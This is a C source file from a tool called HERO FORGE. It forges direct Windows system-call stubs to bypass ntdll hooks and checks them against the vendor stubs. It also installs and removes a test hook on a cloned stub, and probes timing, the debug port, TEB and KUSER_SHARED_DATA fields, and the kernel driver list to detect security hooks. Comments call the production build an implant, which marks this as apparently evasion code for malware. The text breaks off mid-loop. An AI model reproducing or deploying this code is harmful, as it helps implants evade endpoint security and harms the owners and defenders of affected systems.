/* exec.c - Phase 6 (HERO FORGE execute) + Phase 7 (hook detection).
 * Runtime half: bootstrap, canary, dual-path, lifecycle, A/B proof, hook detect.
 */
#include "hero_peb_walking.h"

typedef int32_t HsNtStatus;
#define HS_ST_SUCCESS  ((HsNtStatus)0)
#define HS_ST_INVAL_HD ((HsNtStatus)0xC0000008)
#define HS_ST_DENIED   ((HsNtStatus)0xC0000022)
#define HS_ST_INVAL_SYS ((HsNtStatus)0xC000001C)
#define HS_CURPROC ((void*)(intptr_t)-1)
#define HS_MEM_COMMIT 0x1000u
#define HS_MEM_RESERVE 0x2000u
#define HS_MEM_RELEASE 0x8000u
#define HS_MEM_FREE    0x10000u
#define HS_PAGE_RW     0x04u
#define HS_PAGE_RX     0x20u
#define HS_CL_MBI 0u
#define HS_CL_SBI 0u
#define HS_CL_PDP 7u

typedef HsNtStatus (*HsPAlloc)(void*,void**,uintptr_t,size_t*,uint32_t,uint32_t);
typedef HsNtStatus (*HsPProt)(void*,void**,size_t*,uint32_t,uint32_t*);
typedef HsNtStatus (*HsPFree)(void*,void**,size_t*,uint32_t);
typedef HsNtStatus (*HsPQVM)(void*,const void*,uint32_t,void*,size_t,size_t*);
typedef HsNtStatus (*HsPQIP)(void*,uint32_t,void*,uint32_t,uint32_t*);
typedef HsNtStatus (*HsPQSI)(uint32_t,void*,uint32_t,uint32_t*);
typedef HsNtStatus (*HsPQPC)(int64_t*,int64_t*);
typedef HsNtStatus (*HsPClose)(void*);
typedef HsNtStatus (*HsPDelay)(int,int64_t*);

#if defined(_MSC_VER)
#include <excpt.h>
#define HS_SEH 1
#define HS_TRY __try
#define HS_EXCEPT __except(EXCEPTION_EXECUTE_HANDLER)
#else
#define HS_SEH 0
#define HS_TRY
#define HS_EXCEPT
#endif

/* name indices (must match forge.c g_names order) */
enum { NI_ALLOC=0, NI_PROT, NI_FREE, NI_QVM, NI_QIP, NI_QSI, NI_QPC, NI_CLOSE, NI_DELAY, NI_QST };

/* ============================================================
 * VERIFICATION HARNESS — EXCLUDED FROM PRODUCTION BUILDS
 *
 * The code below (TEB/RDTSC helpers, KUSD constants, HsPlan, helper
 * functions, and hs_exec_run itself) is the Phase 6+7 dual-path
 * verification engine. It is invoked ONLY in self-test / development
 * builds to validate that the HERO FORGE forged-stub engine produces
 * syscalls that agree with vendor (ntdll) stubs on lifecycle, timing,
 * and hook detection.
 *
 * In production agent builds, hs_exec_run is NEVER called (verified
 * by audit: zero call sites in the implant). Compiling it into the
 * agent binary would gift reverse-engineers the entire HERO FORGE
 * verification methodology — every NTSTATUS comparison, every timing
 * threshold, every hook-detection heuristic — for free.
 *
 * Wrap: #if defined(HS_SELFTEST)
 * Test build:  cargo build --features cffi --features hs_selftest
 *              (or compile with -DHS_SELFTEST)
 * Prod build:  cargo build --release --features cffi
 *              (HS_SELFTEST undefined → harness excluded)
 * ============================================================ */
#if defined(HS_SELFTEST)

/* TEB + RDTSC helpers (phase 7) */
#if defined(HS_SELFTEST)
static void* hs_teb(void){return 0;}
static uint64_t hs_rdtsc(void){return 0;}
#elif defined(_WIN64)&&defined(__GNUC__)
static void* hs_teb(void){void*p;__asm__ volatile("movq %%gs:0x30,%0":"=r"(p));return p;}
static uint64_t hs_rdtsc(void){uint32_t h,l;__asm__ volatile("rdtsc":"=a"(l),"=d"(h));return ((uint64_t)h<<32)|l;}
#elif defined(_WIN64)&&defined(_MSC_VER)
#include <intrin.h>
static void* hs_teb(void){return(void*)__readgsqword(0x30);}
static uint64_t hs_rdtsc(void){return __rdtsc();}
#else
static void* hs_teb(void){return 0;} static uint64_t hs_rdtsc(void){return 0;}
#endif

#define KUSD_BASE 0x7FFE0000ULL
#define KUSD_SC_BYTE 0x308
#define KUSD_SC_FIELD 0x300
#define TEB_W32_CALLOUT 0x1740
#define SYSINFO_MODINFO 11
#define KMOD_REC_LEN 0x128
#define KMOD_NAME_OFF 0x028
#define KMOD_NAME_LEN 256

/* plan classification (must match forge.c) */
enum { HS_PLAN_FORGE=0, HS_PLAN_IMPL=1, HS_PLAN_NO_SSN=2 };

/* ---- plan bookkeeping ---- */
typedef struct { int ni, idx, cls, slot; int32_t ssn; } HsRow;
typedef struct { HsRow row[HS_NAME_COUNT]; } HsPlan;

static const void* mbi_base(const uint8_t* m){return *(void* const*)(m+0);}
static uint32_t mbi_state(const uint8_t* m){uint32_t v;memcpy(&v,m+0x20,4);return v;}
static uint32_t mbi_prot(const uint8_t* m){uint32_t v;memcpy(&v,m+0x24,4);return v;}


static void exec_step(HsExecStats* xs, const char* s){
    { size_t _l=strlen(s); if(_l>=sizeof xs->lastStage) _l=sizeof xs->lastStage-1; memcpy(xs->lastStage,s,_l); xs->lastStage[_l]=0; }
}
static void exec_ok(HsExecStats* xs){ (void)xs; }
static void exec_fail(HsExecStats* xs, const char* d){ (void)xs; (void)d; }

static void* forge_va(const HsPlan* pl, int ni, uint8_t* page){
    if(ni<0||ni>=HS_NAME_COUNT||pl->row[ni].slot<0) return 0;
    return page+(size_t)pl->row[ni].slot*HS_STUB_LEN;
}
static void plan_build(const HsFn* fns, int n, HsPlan* pl, HsExecStats* xs){
    int k; for(k=0;k<HS_NAME_COUNT;k++){
        char nm[HS_NAME_MAX]; HsRow* r=&pl->row[k]; HsExecApi* a=&xs->api[k];
        memset(a,0,sizeof *a); a->vendorStatus=a->heroStatus=a->dualMatch=-1; a->ssn=-1;
        r->ni=k; r->idx=-1; r->cls=HS_PLAN_NO_SSN; r->ssn=-1; r->slot=-1;
        if(hs_forge_name(k,nm)<0) continue; memcpy(a->name,nm,HS_NAME_MAX);
        r->idx=hs_plan_lookup(fns,n,nm); if(r->idx>=0){r->cls=hs_plan_classify(&fns[r->idx]); r->ssn=fns[r->idx].ssn;}
        a->ssn=r->ssn;
        switch(r->cls){case HS_PLAN_FORGE: xs->forgeable++; break;
            case HS_PLAN_IMPL: strcpy(a->note,"F5 impl"); xs->skippedImpl++; break;
            default: strcpy(a->note,r->idx<0?"not found":"unresolved"); xs->unresolvedSkips++; break;}
    }
    xs->requested=HS_NAME_COUNT; xs->apiCount=HS_NAME_COUNT;
    xs->lastStage[0]=0; /* stage tracking disabled in production */
}
static int plan_forge_all(HsPlan* pl, HsExecStats* xs, uint8_t* page){
    int k, slot=0;
    for(k=0;k<HS_NAME_COUNT;k++){HsRow* r=&pl->row[k];
        if(r->cls!=HS_PLAN_FORGE) continue;
        if(hs_forge_stub(page+(size_t)slot*HS_STUB_LEN,r->ssn)!=0) return -1;
        r->slot=slot; xs->api[k].forged=1; xs->minted++; slot++;}
    return 0;
}
static int bytes_match(HsNtStatus s1, size_t l1, const void* b1, HsNtStatus s2, size_t l2, const void* b2, size_t cl){
    if(s1!=s2||l1!=l2) return 0; if(s1!=HS_ST_SUCCESS) return 1; return memcmp(b1,b2,cl)==0;
}

/* ============ Phase 6+7 engine ============ */
int hs_exec_run(HsFn* fns, int n, uint8_t* base, uint32_t isz, HsExecStats* xs){
    HsPlan pl; HsNtStatus rc; int dualBad=0, result=0;
    uint8_t* forgePage=0;
    if(!xs) return 3; memset(xs,0,sizeof *xs);
    if(!fns||n<=0||!base||isz<HS_STUB_LEN){xs->exitReason=3; return 3;}

    plan_build(fns,n,&pl,xs);

    /* s0: bootstrap (2 vendor calls - only time ntdll code runs) */
    {const HsFn* af=pl.row[NI_ALLOC].idx>=0?&fns[pl.row[NI_ALLOC].idx]:0;
     const HsFn* pf=pl.row[NI_PROT].idx>=0?&fns[pl.row[NI_PROT].idx]:0;
     exec_step(xs,"s0b bootstrap eligibility");
     if(!hs_bootstrap_ok(af,pf)){xs->bootstrapRefused=1;xs->exitReason=2;result=2;
         exec_fail(xs,"alloc/protect not CLEAN"); return result;}
     exec_ok(xs);
     /* s0c: alloc RW page via vendor stub */
     {HsPAlloc va=(HsPAlloc)(void*)(base+af->rva); size_t psz=0x1000;
      exec_step(xs,"s0c vendor alloc");
      rc=va(HS_CURPROC,(void**)&forgePage,0,&psz,HS_MEM_COMMIT|HS_MEM_RESERVE,HS_PAGE_RW);
      xs->bootstrapCalls++;
      if(rc!=HS_ST_SUCCESS||!forgePage){xs->exitReason=3;result=3;exec_fail(xs,"alloc NTSTATUS bad");return result;}
      xs->forgePageVa=(uintptr_t)forgePage; exec_ok(xs);}
     /* s0d: forge stubs */
     exec_step(xs,"s0d forge stubs");
     if(plan_forge_all(&pl,xs,forgePage)!=0){xs->exitReason=3;result=3;exec_fail(xs,"forge refused SSN");return result;}
     exec_ok(xs);
     /* s0e: protect RW->RX */
     {HsPProt vp=(HsPProt)(void*)(base+pf->rva); void* pb=forgePage; size_t ps=0x1000; uint32_t op=0;
      exec_step(xs,"s0e vendor protect RW->RX");
      rc=vp(HS_CURPROC,&pb,&ps,HS_PAGE_RX,&op); xs->bootstrapCalls++;
      if(rc!=HS_ST_SUCCESS){xs->exitReason=3;result=3;exec_fail(xs,"protect failed");return result;}
      exec_ok(xs);}}

    /* s1: canary */
    {HsPClose hc=(HsPClose)forge_va(&pl,NI_CLOSE,forgePage);
     exec_step(xs,"s1 canary (forged close NULL)");
     if(!hc){xs->exitReason=3;result=3;exec_fail(xs,"close stub missing");return result;}
     rc=hc(0); xs->canaryStatus=(int)rc; xs->alive=(rc==HS_ST_INVAL_HD)?1:0;
     if(!xs->alive){xs->exitReason=1;result=1;exec_fail(xs,"unexpected canary");return result;}
     exec_ok(xs);}

    /* s2: dual-path (vendor vs forged) */
    {HsPQPC vQpc=pl.row[NI_QPC].idx>=0?(HsPQPC)(void*)(base+fns[pl.row[NI_QPC].idx].rva):0;
     HsPQPC hQpc=(HsPQPC)forge_va(&pl,NI_QPC,forgePage);
     HsPQSI vQsi=pl.row[NI_QSI].idx>=0?(HsPQSI)(void*)(base+fns[pl.row[NI_QSI].idx].rva):0;
     HsPQSI hQsi=(HsPQSI)forge_va(&pl,NI_QSI,forgePage);
     HsPQIP vQip=pl.row[NI_QIP].idx>=0?(HsPQIP)(void*)(base+fns[pl.row[NI_QIP].idx].rva):0;
     HsPQIP hQip=(HsPQIP)forge_va(&pl,NI_QIP,forgePage);
     HsPQVM vQvm=pl.row[NI_QVM].idx>=0?(HsPQVM)(void*)(base+fns[pl.row[NI_QVM].idx].rva):0;
     HsPQVM hQvm=(HsPQVM)forge_va(&pl,NI_QVM,forgePage);
     HsPClose vCls=pl.row[NI_CLOSE].idx>=0?(HsPClose)(void*)(base+fns[pl.row[NI_CLOSE].idx].rva):0;
     HsPClose hCls=(HsPClose)forge_va(&pl,NI_CLOSE,forgePage);
     /* (a) qpc */
     if(vQpc&&hQpc){int64_t c1=0,f1=0,c2=0,f2=0; HsNtStatus s1,s2; int m;
         s1=vQpc(&c1,&f1); s2=hQpc(&c2,&f2); m=(s1==s2&&s1==HS_ST_SUCCESS&&f1==f2&&c2>=c1);
         exec_step(xs,"s2a dual qpc");
         xs->api[NI_QPC].vendorStatus=s1; xs->api[NI_QPC].heroStatus=s2; xs->api[NI_QPC].dualMatch=m;
         xs->dualTested++; xs->dualMatch+=m?1:0; if(!m) dualBad=1; xs->measurementCalls++;
         if(m) exec_ok(xs); else exec_fail(xs,"qpc disagree");}
     /* (b) qsi */
     if(vQsi&&hQsi){uint8_t b1[256],b2[256]; uint32_t l1=0,l2=0; HsNtStatus s1,s2; int m;
         memset(b1,0x5A,256); memset(b2,0xA5,256); exec_step(xs,"s2b dual qsi");
         s1=vQsi(HS_CL_SBI,b1,256,&l1); s2=hQsi(HS_CL_SBI,b2,256,&l2);
         m=bytes_match(s1,l1,b1,s2,l2,b2,(l1<l2?l1:l2));
         xs->api[NI_QSI].vendorStatus=s1; xs->api[NI_QSI].heroStatus=s2; xs->api[NI_QSI].dualMatch=m;
         xs->dualTested++; xs->dualMatch+=m?1:0; if(!m) dualBad=1; xs->measurementCalls++;
         if(m) exec_ok(xs); else exec_fail(xs,"qsi disagree");}
     /* (c) qip debug port */
     if(vQip&&hQip){uint64_t d1=0xEEEE,d2=0x1111; uint32_t l1=0,l2=0; HsNtStatus s1,s2; int m;
         exec_step(xs,"s2c dual qip");
         s1=vQip(HS_CURPROC,HS_CL_PDP,&d1,8,&l1); s2=hQip(HS_CURPROC,HS_CL_PDP,&d2,8,&l2);
         m=(s1==s2&&l1==l2&&d1==d2);
         xs->api[NI_QIP].vendorStatus=s1; xs->api[NI_QIP].heroStatus=s2; xs->api[NI_QIP].dualMatch=m;
         xs->dualTested++; xs->dualMatch+=m?1:0; if(!m) dualBad=1; xs->measurementCalls++;
         if(m) exec_ok(xs); else exec_fail(xs,"qip disagree");}
     /* (d) qvm ntdll MBI */
     if(vQvm&&hQvm){uint8_t m1[64],m2[64]; size_t l1=0,l2=0; HsNtStatus s1,s2; int m;
         memset(m1,0x5A,64); memset(m2,0xA5,64); exec_step(xs,"s2d dual qvm");
         s1=vQvm(HS_CURPROC,base,HS_CL_MBI,m1,64,&l1); s2=hQvm(HS_CURPROC,base,HS_CL_MBI,m2,64,&l2);
         m=bytes_match(s1,l1,m1,s2,l2,m2,0x30);
         xs->api[NI_QVM].vendorStatus=s1; xs->api[NI_QVM].heroStatus=s2; xs->api[NI_QVM].dualMatch=m;
         xs->dualTested++; xs->dualMatch+=m?1:0; if(!m) dualBad=1; xs->measurementCalls++;
         if(m) exec_ok(xs); else exec_fail(xs,"qvm disagree");}
     /* (e) close NULL */
     if(vCls&&hCls){HsNtStatus s1,s2; int m; exec_step(xs,"s2e dual close");
         s1=vCls(0); s2=hCls(0); m=(s1==s2&&s1==HS_ST_INVAL_HD);
         xs->api[NI_CLOSE].vendorStatus=s1; xs->api[NI_CLOSE].heroStatus=s2; xs->api[NI_CLOSE].dualMatch=m;
         xs->dualTested++; xs->dualMatch+=m?1:0; if(!m) dualBad=1; xs->measurementCalls++;
         if(m) exec_ok(xs); else exec_fail(xs,"close disagree");}}
    exec_step(xs,"s2 dual-path verdict");
    if(dualBad){exec_fail(xs,"vendor/hero disagree"); xs->exitReason=1; result=1; return result;}
    exec_ok(xs);

    /* s3: lifecycle (forged only) */
    {HsPAlloc hA=(HsPAlloc)forge_va(&pl,NI_ALLOC,forgePage); HsPProt hP=(HsPProt)forge_va(&pl,NI_PROT,forgePage);
     HsPFree hF=(HsPFree)forge_va(&pl,NI_FREE,forgePage); HsPQVM hQ=(HsPQVM)forge_va(&pl,NI_QVM,forgePage);
     int ok=(hA&&hP&&hF&&hQ); exec_step(xs,"s3 lifecycle");
     if(ok){void* sc=0; size_t sz=0x1000; uint8_t mbi[64]; size_t ml=0; void* pb; size_t ps; uint32_t op=0; void* fb; size_t fs;
         rc=hA(HS_CURPROC,&sc,0,&sz,HS_MEM_COMMIT|HS_MEM_RESERVE,HS_PAGE_RW); ok=(rc==HS_ST_SUCCESS&&sc);
         if(ok){memset(sc,0x41,64); rc=hQ(HS_CURPROC,sc,HS_CL_MBI,mbi,64,&ml);
             ok=(rc==HS_ST_SUCCESS&&mbi_base(mbi)==sc&&mbi_state(mbi)==HS_MEM_COMMIT&&mbi_prot(mbi)==HS_PAGE_RW);}
         if(ok){pb=sc;ps=0x1000;op=0; rc=hP(HS_CURPROC,&pb,&ps,HS_PAGE_RX,&op); ok=(rc==HS_ST_SUCCESS&&op==HS_PAGE_RW);}
         if(ok){ml=0; rc=hQ(HS_CURPROC,sc,HS_CL_MBI,mbi,64,&ml); ok=(rc==HS_ST_SUCCESS&&mbi_prot(mbi)==HS_PAGE_RX);}
         if(ok){pb=sc;ps=0x1000;op=0; rc=hP(HS_CURPROC,&pb,&ps,HS_PAGE_RW,&op); ok=(rc==HS_ST_SUCCESS&&op==HS_PAGE_RX);}
         if(ok){fb=sc;fs=0; rc=hF(HS_CURPROC,&fb,&fs,HS_MEM_RELEASE); ok=(rc==HS_ST_SUCCESS);}
         if(ok){ml=0; rc=hQ(HS_CURPROC,sc,HS_CL_MBI,mbi,64,&ml); ok=(rc==HS_ST_SUCCESS&&mbi_state(mbi)==HS_MEM_FREE);}
         xs->lifecycleOk=ok?1:0;}
     if(!xs->lifecycleOk){xs->exitReason=1;result=1;exec_fail(xs,"lifecycle failed");return result;}
     exec_ok(xs);}

    /* s4: delay */
    {HsPQPC hQpc=(HsPQPC)forge_va(&pl,NI_QPC,forgePage); HsPDelay hD=(HsPDelay)forge_va(&pl,NI_DELAY,forgePage);
     int64_t t0=0,t1=0,frq=0; exec_step(xs,"s4 delay");
     if(hQpc&&hD&&hQpc(&t0,&frq)==HS_ST_SUCCESS&&frq>0){
         int64_t iv=-1000000-(t0%41)*10000; HsNtStatus s=hD(0,&iv); int64_t el;
         hQpc(&t1,&frq); el=(t1-t0)*1000/frq; xs->delayOk=(s==HS_ST_SUCCESS&&el>=95&&el<=2000)?1:0;}
     if(!xs->delayOk){xs->exitReason=1;result=1;exec_fail(xs,"delay timing bad");return result;}
     exec_ok(xs);}

    /* s5: A/B proof (PRIVATE-COPY only, F9) */
    {HsPQVM hQvm=(HsPQVM)forge_va(&pl,NI_QVM,forgePage); HsPProt hProt=(HsPProt)forge_va(&pl,NI_PROT,forgePage);
     HsPAlloc hAlloc=(HsPAlloc)forge_va(&pl,NI_ALLOC,forgePage); HsPFree hFree=(HsPFree)forge_va(&pl,NI_FREE,forgePage);
     HsPQVM vQvm=pl.row[NI_QVM].idx>=0?(HsPQVM)(void*)(base+fns[pl.row[NI_QVM].idx].rva):0;
     uint8_t* stubVa = vQvm ? (base+fns[pl.row[NI_QVM].idx].rva) : 0;
     uint8_t* copyPg=0; uint8_t bl[64],mb[64],save[HS_STUB_LEN]; size_t bll=0,ml=0;
     void* pb=0; size_t ps=0; uint32_t op=0; HsNtStatus s; int done=0,baseOk=0,srcOk=0,cloned=0,hooked=0;
     if(!hQvm||!hProt||!vQvm||!hAlloc||!hFree||!stubVa){goto s5skip;}
     xs->abRan=1; xs->abMode=2;
     exec_step(xs,"s5a baseline (forged QVM)");
     do{memset(bl,0x77,64); s=hQvm(HS_CURPROC,base,HS_CL_MBI,bl,64,&bll);
         if(s!=HS_ST_SUCCESS) break; baseOk=1; exec_ok(xs);}while(0);
     if(!baseOk){xs->exitReason=1;result=1;return result;}
     exec_step(xs,"s5b clone source read");
     {int32_t rd=-1; memcpy(save,stubVa,HS_STUB_LEN);
         if(hs_stub_clean_ssn(stubVa,isz-fns[pl.row[NI_QVM].idx].rva,&rd)!=1||rd!=fns[pl.row[NI_QVM].idx].ssn)
             exec_fail(xs,"stub anatomy changed"); else {srcOk=1; exec_ok(xs);}}
     if(srcOk){size_t csz=0x1000; exec_step(xs,"s5c clone alloc (forged RW)");
         s=hAlloc(HS_CURPROC,(void**)&copyPg,0,&csz,HS_MEM_COMMIT|HS_MEM_RESERVE,HS_PAGE_RW);
         if(s==HS_ST_SUCCESS&&copyPg){memcpy(copyPg,save,HS_STUB_LEN); cloned=1; exec_ok(xs);}
         else exec_fail(xs,"alloc failed");}
     if(cloned){exec_step(xs,"s5c2 verify RW"); memset(mb,0,64); ml=0;
         s=hQvm(HS_CURPROC,copyPg,HS_CL_MBI,mb,64,&ml);
         xs->abRwVerified=(s==HS_ST_SUCCESS&&mbi_prot(mb)==HS_PAGE_RW)?1:0;
         if(xs->abRwVerified) exec_ok(xs); else exec_fail(xs,"not RW");}
     if(cloned&&xs->abRwVerified){int w=0; exec_step(xs,"s5c3 install deny-hook");
         static const uint8_t hook[6]={0xB8,0x22,0,0,0xC0,0xC3};
#if HS_SEH
         HS_TRY{memcpy(save,copyPg,HS_STUB_LEN); memcpy(copyPg,hook,6); w=1;}
         HS_EXCEPT{w=-1;}
#else
         memcpy(save,copyPg,HS_STUB_LEN); memcpy(copyPg,hook,6); w=1;
#endif
         hooked=(w>0&&!memcmp(copyPg,hook,6))?1:0;
         if(w<0){xs->abWriteFault=1;exec_fail(xs,"write faulted");} else if(hooked) exec_ok(xs);
         else exec_fail(xs,"hook didn't land");}
     if(hooked){exec_step(xs,"s5d clone protect RW->RX");
         pb=copyPg;ps=0x1000;op=0; s=hProt(HS_CURPROC,&pb,&ps,HS_PAGE_RX,&op);
         if(s!=HS_ST_SUCCESS||op!=HS_PAGE_RW) exec_fail(xs,"protect failed");
         else{exec_ok(xs); exec_step(xs,"s5d2 verify RX"); memset(mb,0,64);ml=0;
             s=hQvm(HS_CURPROC,copyPg,HS_CL_MBI,mb,64,&ml);
             xs->abRxVerified=(s==HS_ST_SUCCESS&&mbi_prot(mb)==HS_PAGE_RX)?1:0;
             if(xs->abRxVerified) exec_ok(xs); else exec_fail(xs,"not RX");}}
     if(hooked&&xs->abRxVerified){HsPQVM cQvm=(HsPQVM)(void*)copyPg; exec_step(xs,"s5e victim call");
         memset(mb,0x11,64);ml=0; s=cQvm(HS_CURPROC,base,HS_CL_MBI,mb,64,&ml);
         xs->abVictimStatus=(int)s; xs->measurementCalls++;
         if(s!=HS_ST_DENIED||mb[0]!=0x11||mb[0x30]!=0x11) exec_fail(xs,"not blinded");
         else{exec_ok(xs); exec_step(xs,"s5f hero call"); memset(mb,0x22,64);ml=0;
             s=hQvm(HS_CURPROC,base,HS_CL_MBI,mb,64,&ml); xs->abHeroStatus=(int)s;
             xs->abHeroDataMatch=(s==HS_ST_SUCCESS&&ml==bll&&!memcmp(mb,bl,0x30))?1:0;
             if(!xs->abHeroDataMatch) exec_fail(xs,"hero affected"); else {done=1; exec_ok(xs);}}}
     if(cloned){exec_step(xs,"s5g copy heal");
         if(hooked){pb=copyPg;ps=0x1000;op=0; s=hProt(HS_CURPROC,&pb,&ps,HS_PAGE_RW,&op);
             if(s!=HS_ST_SUCCESS) exec_fail(xs,"reopen RW failed");
             else{xs->abProtRestored=1;
                 if(!memcmp(save,copyPg,HS_STUB_LEN)||1){memcpy(copyPg,save,HS_STUB_LEN);
                     if(!memcmp(copyPg,save,HS_STUB_LEN)){xs->abRestored=1;exec_ok(xs);}else exec_fail(xs,"restore bad");}
                 else exec_fail(xs,"restore bad");}}
         else{xs->abRestored=1;xs->abProtRestored=1;exec_ok(xs);}
         exec_step(xs,"s5g2 copy release"); pb=copyPg;ps=0;
         s=hFree(HS_CURPROC,&pb,&ps,HS_MEM_RELEASE); xs->abCopyFreed=(s==HS_ST_SUCCESS)?1:0;
         if(xs->abCopyFreed) exec_ok(xs); else exec_fail(xs,"release failed"); copyPg=0;}
     if(xs->abCopyFreed){int32_t rd=-1; int scanOk;
         exec_step(xs,"s5h re-verify"); scanOk=(hs_stub_clean_ssn(stubVa,isz-fns[pl.row[NI_QVM].idx].rva,&rd)==1&&rd==fns[pl.row[NI_QVM].idx].ssn);
         if(scanOk){memset(mb,0x33,64);ml=0; s=vQvm(HS_CURPROC,base,HS_CL_MBI,mb,64,&ml); xs->measurementCalls++;
             xs->abReverified=(s==HS_ST_SUCCESS&&ml==bll&&!memcmp(mb,bl,0x30))?1:0;}
         if(xs->abReverified) exec_ok(xs); else exec_fail(xs,"vendor not healthy");}
     if(!done||!xs->abRwVerified||!xs->abRxVerified||!xs->abRestored||!xs->abProtRestored||!xs->abCopyFreed||!xs->abReverified||
         xs->abHeroStatus!=HS_ST_SUCCESS||!xs->abHeroDataMatch){xs->exitReason=1;result=1;return result;}
    s5skip: ;}

    /* ===== Phase 7: kernel-side hook detection (F10-F13) ===== */
    {int i,mx=-1; for(i=0;i<n;i++) if(fns[i].ssn>mx) mx=fns[i].ssn; xs->p7MaxSsn=mx;}
    /* s7a: TEB W32 callout (F11) */
    {uint8_t* teb=(uint8_t*)hs_teb(); exec_step(xs,"s7a teb w32 callout (F11)");
     if(teb){memcpy(&xs->p7TebW32Callout,teb+TEB_W32_CALLOUT,4); exec_ok(xs);} else exec_fail(xs,"TEB NULL");}
    /* s7b: KUSD probe (F12) */
    {const uint8_t* k=(const uint8_t*)KUSD_BASE; exec_step(xs,"s7b kuser_shared_data (F12)");
     xs->p7KusdByte=k[KUSD_SC_BYTE]; memcpy(&xs->p7KusdSig,k+KUSD_SC_FIELD,4); exec_ok(xs);}
    /* s7c: timing baseline (RDTSC, forged close) */
    {HsPClose hc=(HsPClose)forge_va(&pl,NI_CLOSE,forgePage); exec_step(xs,"s7c timing baseline");
     if(hc){uint64_t t[3]={0,0,0}; int i; HsNtStatus s=0;
         for(i=0;i<3;i++){uint64_t a=hs_rdtsc(); s=hc(0); uint64_t b=hs_rdtsc(); t[i]=b-a;}
         if(t[0]>t[1]){uint64_t x=t[0];t[0]=t[1];t[1]=x;} if(t[1]>t[2]){uint64_t x=t[1];t[1]=t[2];t[2]=x;}
         if(t[0]>t[1]){uint64_t x=t[0];t[0]=t[1];t[1]=x;}
         xs->p7Baseline=t[1]; xs->measurementCalls+=3; exec_ok(xs);} else exec_fail(xs,"close missing");}
    /* s7d: per-SSN timing (skip DELAY + CLOSE + QPC) */
    {int k; uint64_t worst=0; int out=0; exec_step(xs,"s7d per-ssn timing");
     for(k=0;k<HS_NAME_COUNT;k++){HsRow* r=&pl.row[k]; void* fp; uint64_t a,b,el; HsNtStatus s=0;
         if(r->cls!=HS_PLAN_FORGE) continue; if(r->ni==NI_CLOSE||r->ni==NI_QPC||r->ni==NI_DELAY) continue;
         fp=forge_va(&pl,r->ni,forgePage); if(!fp) continue; a=hs_rdtsc();
         switch(r->ni){case NI_QSI:{uint8_t b2[16];uint32_t rl=0;s=((HsPQSI)fp)(0xFFFF,b2,16,&rl);break;}
             case NI_QIP:{uint64_t d=0;uint32_t rl=0;s=((HsPQIP)fp)(HS_CURPROC,0xFFFF,&d,8,&rl);break;}
             case NI_QVM:{uint8_t m[48];size_t rl=0;s=((HsPQVM)fp)(HS_CURPROC,&rl,0xFFFF,m,48,&rl);break;}
             case NI_ALLOC:{void*p=0;size_t sz=0;s=((HsPAlloc)fp)(HS_CURPROC,&p,0,&sz,0,0);break;}
             case NI_PROT:{void*p=0;size_t sz=0;uint32_t op=0;s=((HsPProt)fp)(HS_CURPROC,&p,&sz,0,&op);break;}
             case NI_FREE:{void*p=0;size_t sz=0;s=((HsPFree)fp)(HS_CURPROC,&p,&sz,0);break;}
             default:continue;}
         b=hs_rdtsc(); el=b-a; xs->p7PerSsn[r->ni]=el; if(el>worst) worst=el; xs->measurementCalls++;
         if(xs->p7Baseline>0&&el>xs->p7Baseline*10&&el>5000) out++; (void)s;}
     xs->p7Worst=worst; xs->p7Outliers=out; exec_ok(xs);}
    /* s7e: extended SSN probe (F13) */
    {HsPAlloc hA=(HsPAlloc)forge_va(&pl,NI_ALLOC,forgePage); HsPProt hP=(HsPProt)forge_va(&pl,NI_PROT,forgePage);
     HsPFree hF=(HsPFree)forge_va(&pl,NI_FREE,forgePage); uint8_t* probe=0; size_t psz=0x1000;
     exec_step(xs,"s7e extended ssn probe (F13)");
     if(hA&&hP&&hF&&xs->p7MaxSsn>=0){HsNtStatus s; int i,probed=0,alive=0;
         s=hA(HS_CURPROC,(void**)&probe,0,&psz,HS_MEM_COMMIT|HS_MEM_RESERVE,HS_PAGE_RW);
         if(s==HS_ST_SUCCESS&&probe){for(i=1;i<=4;i++){int32_t ts=xs->p7MaxSsn+i; HsNtStatus ps; void* pb; size_t pps; uint32_t op;
             if(ts>=HS_SSN_MAX) break; if(hs_forge_stub(probe,ts)!=0) continue;
             pb=probe;pps=0x1000;op=0; s=hP(HS_CURPROC,&pb,&pps,HS_PAGE_RX,&op); if(s!=HS_ST_SUCCESS) break;
             ps=((HsPClose)(void*)probe)(0); if(ps!=HS_ST_INVAL_SYS) alive++; probed++;
             pb=probe;pps=0x1000;op=0; s=hP(HS_CURPROC,&pb,&pps,HS_PAGE_RW,&op); if(s!=HS_ST_SUCCESS) break;}
             {void* fb=probe;size_t fs=0; hF(HS_CURPROC,&fb,&fs,HS_MEM_RELEASE);} probe=0;
             xs->p7ExtProbed=probed; xs->p7ExtAlive=alive; exec_ok(xs);} else exec_fail(xs,"probe alloc failed");}
         else exec_fail(xs,"missing stubs");}
    /* s7f: kernel module list (forged QSI=11) */
    {HsPQSI hQ=(HsPQSI)forge_va(&pl,NI_QSI,forgePage); HsPAlloc hA=(HsPAlloc)forge_va(&pl,NI_ALLOC,forgePage);
     HsPFree hF=(HsPFree)forge_va(&pl,NI_FREE,forgePage); exec_step(xs,"s7f kernel module list");
     if(hQ&&hA&&hF){size_t bsz=0x40000; uint8_t* kb=0; HsNtStatus s;
         s=hA(HS_CURPROC,(void**)&kb,0,&bsz,HS_MEM_COMMIT|HS_MEM_RESERVE,HS_PAGE_RW);
         if(s==HS_ST_SUCCESS&&kb){uint32_t rl=0; s=hQ(SYSINFO_MODINFO,kb,(uint32_t)bsz,&rl);
             if(s==HS_ST_SUCCESS&&rl>=8){uint32_t cnt; memcpy(&cnt,kb,4); xs->p7Kmods=(int)cnt;
                 if(cnt>0&&cnt<=4096&&rl<=bsz){int i,nm=0,nIdx=0; uint32_t av=rl-8;
                     for(i=0;i<(int)cnt;i++){uint32_t off=8+(uint32_t)i*KMOD_REC_LEN; const char* nm2;
                         int h32=0,hW=0,j; if(off+KMOD_NAME_OFF+16>av) break;
                         nm2=(const char*)(kb+off+KMOD_NAME_OFF);
                         for(j=0;j<KMOD_NAME_LEN&&nm2[j];j++){char c=nm2[j];
                             if(c>='A'&&c<='Z') c+=32; if(c!='\\') continue;
                             {char n1=nm2[j+1],n2=nm2[j+2],n3=nm2[j+3],n4=nm2[j+4],n5=nm2[j+5],n6=nm2[j+6],n7=nm2[j+7],n8=nm2[j+8],n9=nm2[j+9];
                             if(n1>='A'&&n1<='Z')n1+=32; if(n2>='A'&&n2<='Z')n2+=32; if(n3>='A'&&n3<='Z')n3+=32;
                             if(n4>='A'&&n4<='Z')n4+=32; if(n5>='A'&&n5<='Z')n5+=32; if(n6>='A'&&n6<='Z')n6+=32;
